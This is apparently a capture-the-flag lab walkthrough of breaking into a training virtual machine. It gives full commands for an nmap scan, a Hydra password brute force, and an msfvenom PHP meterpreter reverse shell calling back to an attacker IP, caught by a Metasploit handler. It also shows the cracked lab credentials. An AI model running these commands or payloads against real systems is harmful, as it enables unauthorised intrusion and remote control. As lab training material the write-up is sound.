# **Red Team Pentest Walkthrough**

Our target today is a Virtual Machine through the Trilogy Labs website. The first thing we do after the lab is set up is to pull up a terminal and run the tool **netdiscover:**

![image](https://user-images.githubusercontent.com/28605283/83311706-9baaf600-a1d5-11ea-8225-e123e6c37772.png)

We see some important information right off the bat:

*   IP address: 172.16.84.205
*   MAC address: 00:15:5d:01:80:00

Next, we need to run a portscan to get more information on our target. I used nmap with the following command: **nmap -A 172.16.84.205**.

![image](https://user-images.githubusercontent.com/28605283/83311887-428f9200-a1d6-11ea-9115-f3f336488792.png)

More info revealed:

*   Open ports
    *   22 ssh
    *   80 http
*   OS:
    *   Linux
*   Confirmed host IP

Since we have an open HTTP port, the first thing I like to do is check out the webpage to see if there are any obvious vulnerabilities on the website.

![image](https://user-images.githubusercontent.com/28605283/83311922-59ce7f80-a1d6-11ea-952d-57fb7590123e.png)

Navigating around the sitemap, we come across **172.16.84.205/company_folders/company_culture/file1.txt** with the following message:

![image](https://user-images.githubusercontent.com/28605283/83311985-8b474b00-a1d6-11ea-8bec-60ca2d304a1f.png)

So, I navigated to **172.16.84.205/company_folders/secret_folder/** and was greeted by the following popup:

![image](https://user-images.githubusercontent.com/28605283/83312011-a0bc7500-a1d6-11ea-8f46-cfe4bc47e7c2.png)

Ok, so now we have a name! I wanted to see if I can brute force the login with “ashton” as the username. I used the tool **Hydra** to accomplish this. The command I used was: **hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 172.16.84.205 http-get /company_folders/secret_folder**

![image](https://user-images.githubusercontent.com/28605283/83312027-b16ceb00-a1d6-11ea-8f91-4ce1760453b3.png)

With that, we get our first password! **ashton:leopoldo**

![image](https://user-images.githubusercontent.com/28605283/83312051-bfbb0700-a1d6-11ea-8a5f-054047554002.png)

With this information in hand, I went back to the website and entered the credentials to gain access to the secret_folder. I was then shown this: 

![image](https://user-images.githubusercontent.com/28605283/83312079-d3666d80-a1d6-11ea-849b-b8a222c26592.png)

I clicked through to connecting_to_webdav and found a note that looked to be very useful.

![image](https://user-images.githubusercontent.com/28605283/83312095-df522f80-a1d6-11ea-8adf-07c384c6adab.png)

So I followed the directions in the above note, and cracked the hash for ryan’s account password. I ended up with the password “linux4u”, and added the webdav to my files!

![image](https://user-images.githubusercontent.com/28605283/83312112-eda04b80-a1d6-11ea-8528-ebaa516e4ac0.png)

The instructions state that I can now share and upload files, so I want to upload a reverse shell to the server. For this, I used the tool **msfvenom** with the following command: **msfvenom -p php/meterpreter/reverse_tcp lhost=172.16.84.55 lport=4444 >> shell.php**

This command creates a PHP reverse shell with our IP as the host using port 4444.

![image](https://user-images.githubusercontent.com/28605283/83312140-01e44880-a1d7-11ea-8a90-f4cdc6ce1025.png)

With the payload created, I then opened up Metasploit and navigated to the /exploit/multil/handler option. I then set my options, with my payload being set as the meterpreter reverse tcp, and the LHOST as my IP.

![image](https://user-images.githubusercontent.com/28605283/83312168-10326480-a1d7-11ea-9e04-6da97cd33d30.png)

Now that the listener is up and running, I put the shell.php file into the webdav directory in my files. Then I navigated back to the webdav webpage at 172.16.84.205 and logged in using Ryan’s credentials, and we see the shell.php file successfully uploaded.

![image](https://user-images.githubusercontent.com/28605283/83312185-1aecf980-a1d7-11ea-8c92-b972925cf655.png)

Clicking on the shell.php, our meterpreter session activates and we have a reverse shell. From here, I navigated around the server and found the flag.txt in the root directory.

![image](https://user-images.githubusercontent.com/28605283/83312201-2809e880-a1d7-11ea-9fc7-8d2647e01f06.png)

I used the command **cat flag.txt** and we are all set!

![image](https://user-images.githubusercontent.com/28605283/83312233-36f09b00-a1d7-11ea-9868-dcfb490b3e8c.png)

This was a great, challenging exercise using new techniques and tools! 
